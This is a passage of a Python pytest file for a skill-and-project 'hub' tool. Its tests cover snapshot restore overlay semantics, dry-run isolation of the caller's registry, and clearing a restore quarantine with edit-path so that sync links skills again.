    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})

    def _noisy_sync(args):
        print("a human-readable sync line nobody may parse")

    monkeypatch.setattr(hub, "cmd_sync", _noisy_sync)
    hub.cmd_restore(
        _ns(from_=str(dest), mode="replace", apply=True, sync=True, json=True,
            trust_new_key=True, accept_executable_state=True)
    )
    captured = capsys.readouterr()
    payload = json.loads(captured.out)  # must parse with NOTHING appended
    assert payload["applied"]["applied"] is True
    assert "a human-readable sync line" in captured.err


# ─────────────────────────────────────────────────────────────────────────────
# 12. Overlay semantics, caller isolation, and clearing the quarantine
# ─────────────────────────────────────────────────────────────────────────────


def test_local_files_the_snapshot_lacks_are_reported_as_retained(
    tmp_data_home, tmp_path
):
    """m2: restore is an OVERLAY, in both modes — and it now says so per file.

    `--mode replace` is a REGISTRY mode; it has never owned the filesystem.
    Deleting on a mode flag would silently destroy hand-edits inside a skill the
    user still has, and the pre-restore safety copy only preserves files restore
    itself overwrites. So the divergence is named instead of hidden.
    """
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-overlay"
    snapshot(dest)

    # A file that exists HERE and not in the snapshot.
    (tmp_data_home / "skills" / "alpha" / "local-notes.md").write_text("mine\n")

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["data"]["skills"]["retained"] == ["alpha/local-notes.md"]
    assert plan["report"]["retained_extra_files"] == [
        {"section": "skills", "path": "alpha/local-notes.md"}
    ]

    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (tmp_data_home / "skills" / "alpha" / "local-notes.md").read_text() == "mine\n"


def test_a_dry_run_never_mutates_the_callers_registry(tmp_data_home, tmp_path, outside):
    """m5: `merge_registry` copies two levels; the per-project dicts were SHARED.

    So the quarantine pass stamped `path_unresolved: true` straight into the
    live registry object the CLI had just loaded — during a DRY RUN.
    """
    incoming = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {"ghost": {"path": str(outside / "never-cloned"), "bundles": []}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)

    target = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {"mine": {"path": str(outside / "also-never-cloned"), "bundles": []}},
    }
    before = json.dumps(target, sort_keys=True)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry=target, mode="merge", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["resolved_registry"]["projects"]["mine"]["path_unresolved"] is True
    assert json.dumps(target, sort_keys=True) == before, (
        "the caller's registry must come back untouched from a dry run"
    )


def test_edit_path_clears_the_restore_quarantine_and_sync_writes_again(
    tmp_data_home, outside, capsys, monkeypatch
):
    """PB2: `project_sync_skip_reason` promised "Cleared by `hub project
    edit-path`" and nothing cleared it.

    A restored project was skipped by EVERY sync forever, no matter where it was
    re-pointed — and the restore report's own advice ("point it at the local
    checkout with `hub project edit-path`") was the instruction that did nothing.
    """
    import harnesses as _harnesses

    monkeypatch.setattr(_harnesses, "detect_installed", lambda: {"claude-code"})
    write_skill(tmp_data_home / "skills", "alpha")
    real_checkout = outside / "actually-here"
    real_checkout.mkdir()

    hub.save_registry(
        {
            "version": "1",
            "harnesses_global": ["claude-code"],
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "bundles": {},
            "projects": {
                "restored": {
                    "path": str(outside / "never-cloned"),
                    "bundles": [],
                    "enabled": ["alpha"],
                    "path_unresolved": True,
                }
            },
        }
    )
    assert hub.project_sync_skip_reason(
        hub.load_registry()["projects"]["restored"]
    ) is not None

    hub.cmd_project_edit_path(_ns(name="restored", new_path=str(real_checkout)))
    out = _plain(capsys.readouterr().out)
    assert "cleared the restore quarantine" in out

    cfg = hub.load_registry()["projects"]["restored"]
    assert "path_unresolved" not in cfg
    assert hub.project_sync_skip_reason(cfg) is None
    # `cmd_project_edit_path` auto-syncs, so the skill must already be there.
    link = real_checkout / ".claude" / "skills" / "alpha"
    assert link.is_symlink(), "sync must write to the re-pointed project"
    assert (link / "SKILL.md").is_file()
